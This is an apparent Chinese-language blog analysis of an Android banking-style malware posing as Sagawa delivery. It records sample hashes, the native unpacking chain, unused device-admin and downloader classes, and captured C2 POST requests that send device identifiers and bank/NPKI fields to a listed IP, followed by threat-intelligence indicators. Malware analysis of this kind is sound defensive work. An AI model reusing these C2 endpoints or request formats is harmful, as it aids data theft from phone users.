---
title: Android malware analysis - fake Sagawa malware
---

标签（空格分隔）： AndroidSec

---

## 1.0 样本信息
```
MD5:0fdc23ae9445ab84e2b9d4824ea137f8
证书指纹:
  MD-5: 2BB211C701B44AF41C9B52274B3C7B28 
  SHA-1: 05FB1C007D4A3D43F3E6008ED11FDEB46E948120 
  SHA-256: F020E1491710E0BDEB3ED1FEC7C459C9F855A16C5DB57DBA56629711B1BB32AB 
```
## 2.0 静态分析
### 2.1 程序入口
![](https://i.screenshot.net/j3987ar)
### 2.2 libxxn.so分析
![](https://i.screenshot.net/v835zuz)
#### 2.2.1 Java_huaa_TII_run函数
```c++
int __fastcall Java_huaa_TII_run(int a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  return j_rrr(a1, a3, a4, a5, a6, a7);
}
```
#### 2.2.2 j_rrr函数
```c++
int __fastcall j_rrr(int a1, int a2, int a3, int a4, int a5, int a6)
{
  return rrr(a1, a2, a3, a4, a5, a6);
}
```
#### 2.2.3 rrr函数,先将Asset目录下的nini.dll解密生成mycode.jar,然后将mycode.jar的部分数据生成mycode.dex，然后载入dex,然后删除jar和dex
![](https://i.screenshot.net/njjowao)
### 2.3 拿到mycode.jar进行分析,一部分是证书，另外一部分是dex
![](https://i.screenshot.net/r33p4i8)
#### 2.3.1 主Activity分析
![](https://i.screenshot.net/7gz7ns8)
#### 2.3.2 UK.class服务分析
![](https://i.screenshot.net/1kq3mcd)
#### 2.3.3 BK.class服务分析
![](https://i.screenshot.net/06ld9f1)
#### 2.3.4 申请成为Device Admin权限的LA类，但是没有调用
![](https://i.screenshot.net/52lzmuy)
#### 2.3.5 保存恶意url的xml
![](https://i.screenshot.net/120y5um)
#### 2.3.6 下载new.apk的类，也没有调用
![](https://i.screenshot.net/vzkp2b7)

## 3 行为分析
### 3.1 /servlet/xx 内容
```
POST http://125.227.174.32//servlet/xx HTTP/1.1
ser-Agent: Fiddler
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; MuMu Build/V417IR)
Host: 125.227.174.32
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 134

{"json":"{\"mobile\":\"008796758773174\",\"machine\":\"MuMu\",\"sversion\":\"6.0.1\",\"bank\":\"\",\"provider\":\"\",\"npki\":\"1\"}"}
```
### 3.2 /servlet/GetMessag 内容
```
POST http://125.227.174.32//servlet/GetMessage HTTP/1.1
ser-Agent: Fiddler
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; MuMu Build/V417IR)
Host: 125.227.174.32
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 30

{"json":"{\"mobile\":\"xx\"}"}
```
### 3.3 /servlet/GetMoreMessage 内容
```
POST http://125.227.174.32//servlet/GetMoreMessage HTTP/1.1
ser-Agent: Fiddler
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; MuMu Build/V417IR)
Host: 125.227.174.32
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 43

{"json":"{\"mobile\":\"008796758773174\"}"}
```

### 4 威胁情报
- http://125.227.174.32/  中国-台湾  垃圾邮件
- http://sagawa-aiai.com/ 对应IP 114.40.189.238 中国-台湾-高雄市
- http://67.198.138.244:8081 美国-加利福尼亚州-洛杉矶

### 5 吃颗同事的喜糖，沾沾喜气顺便平复一下单身加班的心情
![](https://i.screenshot.net/p75m4ur)







